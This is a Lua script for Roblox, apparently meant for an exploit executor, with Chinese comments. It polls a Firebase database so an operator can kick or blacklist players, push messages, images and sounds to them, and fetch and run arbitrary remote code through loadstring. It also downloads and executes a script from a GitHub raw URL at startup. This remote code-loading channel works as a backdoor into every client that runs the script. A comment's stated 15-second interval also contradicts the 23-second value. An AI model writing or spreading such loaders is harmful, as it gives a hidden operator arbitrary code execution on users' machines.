local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:GetService("SoundService")
local LocalPlayer = Players.LocalPlayer

------------------ 1. 基础配置区 ------------------
local FIREBASE_URL = "https://bbakll-default-rtdb.firebaseio.com"
local CHECK_INTERVAL = 23 -- 🌟 心跳检测间隔已改为 15 秒
local AUTO_HIDE_TIME = 4  -- 🌟 图片自动消失的时间为 4 秒

-- 📜 进游戏时默认运行的基础脚本列表
local SCRIPT_URLS = {
    "https://raw.githubusercontent.com/CuteLing-XB/Main-storage/refs/heads/main/1038531272/mmnb"
}
---------------------------------------------------

if _G.ScriptRunning then return end
_G.ScriptRunning = true

local lastBroadcastText = nil
local lastPrivateText = nil
local lastImageUrl = nil
local lastSoundId = nil
local lastRemoteScriptUrl = nil

-- 基础弹窗通知函数
local function notify(title, text)
    pcall(function()
        StarterGui:SetCore("SendNotification", { Title = title, Text = text, Duration = 5 })
    end)
end

-- 创建半透明图片 UI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoImageDisplay"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
pcall(function() screenGui.Parent = CoreGui end)
if not screenGui.Parent then screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

local imageLabel = Instance.new("ImageLabel")
imageLabel.Size = UDim2.new(0, 400, 0, 400)
imageLabel.Position = UDim2.new(0.5, -200, 0.5, -200)
imageLabel.BackgroundTransparency = 1
imageLabel.Visible = false
imageLabel.Active = false
imageLabel.Draggable = false
imageLabel.ImageTransparency = 0.2
imageLabel.Parent = screenGui

-- 创建远程音频播放器
local remoteSound = Instance.new("Sound")
remoteSound.Name = "RemoteBackgroundMusic"
remoteSound.Volume = 1
remoteSound.Parent = SoundService

-- 综合后台检测函数
local function doBackgroundCheck()
    task.spawn(function()
        -- ① 检查【全体清场开关】
        local _, kRes = pcall(function() return game:HttpGet(FIREBASE_URL .. "/KickAll.json") end)
        if kRes and (kRes:find("true")) then 
            LocalPlayer:Kick("\n[系统提示] 服务器正在维护，已被远程清场！") 
            return 
        end

        -- ② 检查【黑名单 / 定向踢特定人】
        local bSuccess, bRes = pcall(function() return game:HttpGet(FIREBASE_URL .. "/Blacklist/" .. LocalPlayer.Name .. ".json") end)
        if bSuccess and bRes and bRes ~= "null" and bRes ~= "" and bRes:find("true") then
            LocalPlayer:Kick("\n[黑名单] 你已被管理员远程移出游戏！")
            return
        end

        -- ③ 检查【全体广播】
        local bcSuccess, bcRes = pcall(function() return game:HttpGet(FIREBASE_URL .. "/Broadcast.json") end)
        if bcSuccess and bcRes and bcRes ~= "null" and bcRes ~= "" then
            local text = bcRes:gsub('"', '')
            -- 只有当内容发生变化时才弹窗提醒
            if text ~= "" and text ~= "off" and text ~= lastBroadcastText then
                lastBroadcastText = text
                notify("🔔 全体通知", text)
            end
        end

        -- ④ 检查【远程图片显示】（4秒自动消失）
        local _, imgRes = pcall(function() return game:HttpGet(FIREBASE_URL .. "/ImageUrl.json") end)
        if imgRes and imgRes ~= "null" and imgRes ~= "" then
            local url = imgRes:gsub('"', '')
            if url ~= "off" and lastImageUrl ~= url then
                lastImageUrl = url
                imageLabel.Image = url
                imageLabel.Visible = true
                
                task.delay(AUTO_HIDE_TIME, function()
                    imageLabel.Visible = false
                    lastImageUrl = nil 
                end)
            end
        end

        -- ⑤ 检查【远程音频播放】
        local _, soundRes = pcall(function() return game:HttpGet(FIREBASE_URL .. "/SoundId.json") end)
        if soundRes and soundRes ~= "null" and soundRes ~= "" then
            local sVal = soundRes:gsub('"', '')
            if sVal == "off" or sVal == "0" then
                remoteSound:Stop()
                lastSoundId = nil
            elseif lastSoundId ~= sVal then
                lastSoundId = sVal
                if tonumber(sVal) then
                    remoteSound.SoundId = "rbxassetid://" .. sVal
                else
                    remoteSound.SoundId = sVal
                end
                remoteSound:Play()
            end
        end

        -- ⑥ 检查【远程动态加载执行脚本】
        local _, scriptRes = pcall(function() return game:HttpGet(FIREBASE_URL .. "/RemoteScript.json") end)
        if scriptRes and scriptRes ~= "null" and scriptRes ~= "" then
            local sUrl = scriptRes:gsub('"', '')
            if sUrl ~= "off" and sUrl ~= "" and lastRemoteScriptUrl ~= sUrl then
                lastRemoteScriptUrl = sUrl 
                
                task.spawn(function()
                    local ok, res = pcall(function() return game:HttpGet(sUrl) end)
                    if ok and res then
                        local func, err = loadstring(res)
                        if func then
                            pcall(func)
                            notify("🚀 系统提示", "已成功远程加载执行新脚本！")
                        end
                    end
                end)
            end
        end

        -- ⑦ 检查【个人私信】
        local pSuccess, pRes = pcall(function() return game:HttpGet(FIREBASE_URL .. "/Private/" .. LocalPlayer.Name .. ".json") end)
        if pSuccess and pRes and pRes ~= "null" and pRes ~= "" then
            local text = pRes:gsub('"', '')
            if text ~= "" and text ~= "off" and text ~= lastPrivateText then
                lastPrivateText = text
                notify("📩 开发者私信", text)
            end
        end
    end)
end

-- 静默同步函数（启动时只记录状态，防止进游戏触发历史广播弹窗）
local function syncInitialState()
    pcall(function()
        local bcRes = game:HttpGet(FIREBASE_URL .. "/Broadcast.json")
        if bcRes and bcRes ~= "null" and bcRes ~= "" then
            lastBroadcastText = bcRes:gsub('"', '')
        end
    end)
    
    pcall(function()
        local pRes = game:HttpGet(FIREBASE_URL .. "/Private/" .. LocalPlayer.Name .. ".json")
        if pRes and pRes ~= "null" and pRes ~= "" then
            lastPrivateText = pRes:gsub('"', '')
        end
    end)
end

-- ---------------- 2. 执行入口 ----------------

-- 进游戏立刻先过一次清场和黑名单检查
local _, kRes = pcall(function() return game:HttpGet(FIREBASE_URL .. "/KickAll.json") end)
if kRes and (kRes:find("true")) then LocalPlayer:Kick("\n[系统提示] 已被远程清场！") return end

local bSuccess, bRes = pcall(function() return game:HttpGet(FIREBASE_URL .. "/Blacklist/" .. LocalPlayer.Name .. ".json") end)
if bSuccess and bRes and bRes ~= "null" and bRes ~= "" and bRes:find("true") then
    LocalPlayer:Kick("\n[黑名单] 你已被管理员远程移出游戏！")
    return
end

-- 🌟 1. 静默同步当前后台文本（避免刚进游戏就弹窗）
syncInitialState()

-- 🌟 2. 检查图片/音乐/远程脚本（这几个功能允许进游戏时立刻加载）
doBackgroundCheck()

-- 🌟 3. 并发加载基础脚本列表
for _, url in ipairs(SCRIPT_URLS) do
    task.spawn(function()
        local ok, res = pcall(function() return game:HttpGet(url) end)
        if ok and res then
            local func = loadstring(res)
            if func then pcall(func) end
        end
    end)
    task.wait(0.5)
end

-- 🌟 4. 开启 15 秒心跳检测循环
task.spawn(function()
    while task.wait(CHECK_INTERVAL) do
        doBackgroundCheck()
    end
end)
